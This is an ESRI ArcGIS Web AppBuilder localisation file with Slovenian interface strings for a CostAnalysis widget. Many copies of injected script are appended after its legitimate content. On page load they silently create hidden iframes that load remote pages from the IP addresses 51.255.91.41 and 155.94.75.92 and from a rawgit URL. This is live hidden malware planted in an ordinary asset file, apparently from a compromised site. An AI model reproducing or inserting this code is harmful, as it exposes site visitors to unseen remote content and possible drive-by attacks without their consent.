// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Nastavi konfiguracijsko besedilo:",generalSettings:{tabTitle:"Splo\u0161ne nastavitve",measurementUnitLabel:"Merska enota",currencyLabel:"Merski simbol",roundCostLabel:"Okvirni stro\u0161ki",projectOutputSettings:"Nastavitve rezultatov projekta",typeOfProjectAreaLabel:"Tip projektnega obmo\u010dja",bufferDistanceLabel:"Razdalja obrisa",roundCostValues:{twoDecimalPoint:"Dve decimalni vejici",nearestWholeNumber:"Najbli\u017eje celo \u0161tevilo",
nearestTen:"Najbli\u017eja desetica",nearestHundred:"Najbli\u017eja stotica",nearestThousand:"Najbli\u017eje tiso\u010dice",nearestTenThousands:"Najbli\u017eje desettiso\u010dice"},projectAreaType:{outline:"Obroba",buffer:"Obris"},errorMessages:{currency:"Neveljavna denarna enota",bufferDistance:"Neveljavna razdalja obrisa",outOfRangebufferDistance:"Vrednost mora biti ve\u010dja od 0 in manj\u0161a ali enaka 100"}},projectSettings:{tabTitle:"Nastavitve projekta",costingGeometrySectionTitle:"Dolo\u010di lokacijo za vrednotenje (izbirno)",
costingGeometrySectionNote:"Opomba: Konfiguriranje tega sloja bo uporabniku na podlagi lokacije omogo\u010dilo nastavitev stro\u0161kovnih ena\u010db geoobjektnih predlog.",projectTableSectionTitle:"Mo\u017enost shranjevanja/nalaganja nastavitev projekta (izbirno)",projectTableSectionNote:"Opomba: Konfiguriranje vseh tabel in slojev bo uporabniku omogo\u010dilo shranjevanje/nalaganje projekta za poznej\u0161o uporabo.",costingGeometryLayerLabel:"Stro\u0161kovni geometrijski sloj",fieldLabelGeography:"Polje za izdelovanje napisa lokacije",
projectAssetsTableLabel:"Tabela projektnih sredstev",projectMultiplierTableLabel:"Tabela mno\u017eitelja dodatnih stro\u0161kov projekta",projectLayerLabel:"Projektni sloj",configureFieldsLabel:"Konfiguriraj polja",fieldDescriptionHeaderTitle:"Opis polja",layerFieldsHeaderTitle:"Polje sloja",selectLabel:"Izberi",errorMessages:{duplicateLayerSelection:"Ime sloja ${layerName} je \u017ee bilo izbrano",invalidConfiguration:"Izberite ${fieldsString}"},costingGeometryHelp:"\x3cp\x3ePrikazani bodo poligonski sloji z naslednjimi pogoji: \x3cbr/\x3e \x3cli\x3eSloj mora imeti zmo\u017enost poizvedbe\x3c/li\x3e\x3cli\x3eSloj mora imeti polje GlobalID\x3c/li\x3e\x3c/p\x3e",
fieldToLabelGeographyHelp:"\x3cp\x3eBesedilna in \u0161tevilska polja izbranega stro\u0161kovnega geometrijskega sloja bodo prikazana v spustnem meniju Polje v Napis lokacije.\x3c/p\x3e",projectAssetsTableHelp:"\x3cp\x3ePrikazane bodo tabele z naslednjimi pogoji: \x3cbr/\x3e \x3cli\x3eTabele morajo imeti zmo\u017enost urejanja, in sicer Ustvari, Izbri\u0161i in Posodobi.\u009d\x3c/li\x3e    \x3cli\x3eTabela mora imeti \u0161est polj s to\u010dnimi imeni in tipi podatkov:\x3c/li\x3e\x3cul\x3e\x3cli\x3e AssetGUID (tip polja GUID)\x3c/li\x3e\x3cli\x3e CostEquation (tip polja z besedilom)\x3c/li\x3e\x3cli\x3e Scenarij (tip polja z besedilom)\x3c/li\x3e\x3cli\x3e TemplateName (tip polja z besedilom)\x3c/li\x3e\x3cli\x3e    GeographyGUID (tip polja GUID)\x3c/li\x3e\x3cli\x3e ProjectGUID (tip polja GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3ePrikazane bodo tabele z naslednjimi pogoji: \x3cbr/\x3e \x3cli\x3eTabele morajo imeti mo\u017enost urejanja, in sicer Uredi, Izbri\u0161i, Posodobi.\u009d\x3c/li\x3e    \x3cli\x3eTabela mora imeti pet polj s to\u010dnimi imeni in tipi podatkov:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tOpis (tip polja z besedilom)\x3c/li\x3e\x3cli\x3e\tTip (tip polja z besedilom)\x3c/li\x3e\x3cli\x3e\tVrednost (tip polja decimalno enojno/dvojno)\x3c/li\x3e\x3cli\x3e\tStro\u0161kovni indeks (tip polja celo \u0161tevilo)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (tip polja GUID))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3ePrikazani bodo poligonski sloji z naslednjimi pogoji: \x3cbr/\x3e \x3cli\x3eSloj mora imeti zmo\u017enosti urejanja, in sicer Ustvari, Izbri\u0161i in Posodobi.\x3c/li\x3e    \x3cli\x3eSloji morajo imeti pet polj s to\u010dnimi imeni in tipi podatkov:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (tip polja z besedilom)\x3c/li\x3e\x3cli\x3eOpis (tip polja z besedilom)\x3c/li\x3e\x3cli\x3eTotalassetcost (tip polja decimalno enojno/dvojno)\x3c/li\x3e\x3cli\x3eGrossprojectcost (tip polja enojno/dvojno)\x3c/li\x3e\x3cli\x3eGlobalID (tip polja GlobalID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Nastavitve sloja",layerNameHeaderTitle:"Ime sloja",layerNameHeaderTooltip:"Seznam slojev na karti",EditableLayerHeaderTitle:"Uredljiv",EditableLayerHeaderTooltip:"Vklju\u010dite sloj in njegove predloge v stro\u0161kovnem pripomo\u010dku",SelectableLayerHeaderTitle:"Izberljiv",SelectableLayerHeaderTooltip:"Geometrijo iz geoobjekta je mogo\u010de uporabiti za ustvarjanje novega stro\u0161kovnega elementa",fieldPickerHeaderTitle:"ID projekta (izbirno)",fieldPickerHeaderTooltip:"Izbirno polje (tipa besedila) za shranjevanje ID projekta v",
selectLabel:"Izberi",noAssetLayersAvailable:"Na izbrani spletni karti ni najdenega sloja sredstev",disableEditableCheckboxTooltip:"Ta sloj nima zmo\u017enosti urejanja"},costingInfo:{tabTitle:"Stro\u0161kovne informacije",proposedMainsLabel:"Predlagani glavni",addCostingTemplateLabel:"Dodajte stro\u0161kovno predlogo",manageScenariosTitle:"Upravljaj scenarije",featureTemplateTitle:"Predloga geoobjekta",costEquationTitle:"Stro\u0161kovna ena\u010dba",geographyTitle:"Lokacija",scenarioTitle:"Scenarij",
actionTitle:"Dejanja",scenarioNameLabel:"Ime scenarija",addBtnLabel:"Dodaj",srNoLabel:"\u0160t.",deleteLabel:"Izbri\u0161i",duplicateScenarioName:"Podvoji ime scenarija",hintText:"\x3cdiv\x3eNamig: Uporabite naslednje klju\u010dne besede\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: Uporabi skupno \u0161tevilo sredstev istega tipa na lokaciji\x3c/li\x3e \x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: Uporabi dol\u017eino za linijska sredstva in povr\u0161ino za poligonska sredstva\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: Uporabi skupno dol\u017eino za linijska sredstva in skupno povr\u0161ino za poligonska sredstva istega tipa na lokaciji\x3c/li\x3e\x3c/ul\x3eUporabite lahko funkcije, kot so:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eUredite stro\u0161kovno ena\u010dbo glede na potrebe va\u0161ega projekta.",
noneValue:"Brez",requiredCostEquation:"Neveljavna stro\u0161kovna ena\u010dba za ${layerName} : ${templateName}",duplicateTemplateMessage:"Za ${layerName} : ${templateName} obstaja podvojena predloga",defaultEquationRequired:"Za ${layerName} : ${templateName} je zahtevana privzeta ena\u010dba",validCostEquationMessage:"Vnesite veljavno stro\u0161kovno ena\u010dbo",costEquationHelpText:"Uredite stro\u0161kovno ena\u010dbo glede na potrebe va\u0161ega projekta",scenarioHelpText:"Izberite scenarij glede na potrebe va\u0161ega projekta",
copyRowTitle:"Kopiraj vrstico",noTemplateAvailable:"Dodajte vsaj eno predlogo za ${layerName}",manageScenarioLabel:"Upravljaj scenarij",noLayerMessage:"Vnesite vsaj en sloj v ${tabName}",noEditableLayersAvailable:"Sloji morajo biti ozna\u010deni za urejanje v zavihku nastavitev sloja"},statisticsSettings:{tabTitle:"Nastavitve statistike",addStatisticsLabel:"Dodaj statistiko",fieldNameTitle:"Polje",statisticsTitle:"Napis",addNewStatisticsText:"Dodaj novo statistiko",deleteStatisticsText:"Izbri\u0161i statistiko",
moveStatisticsUpText:"Premakni statistiko navzgor",moveStatisticsDownText:"Premakni statistiko navzdol",selectDeselectAllTitle:"Izberi vse"},statisticsType:{countLabel:"\u0160tetje",averageLabel:"Povpre\u010dje",maxLabel:"Maksimum",minLabel:"Minimum",summationLabel:"Vsota",areaLabel:"Povr\u0161ina",lengthLabel:"Dol\u017eina"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});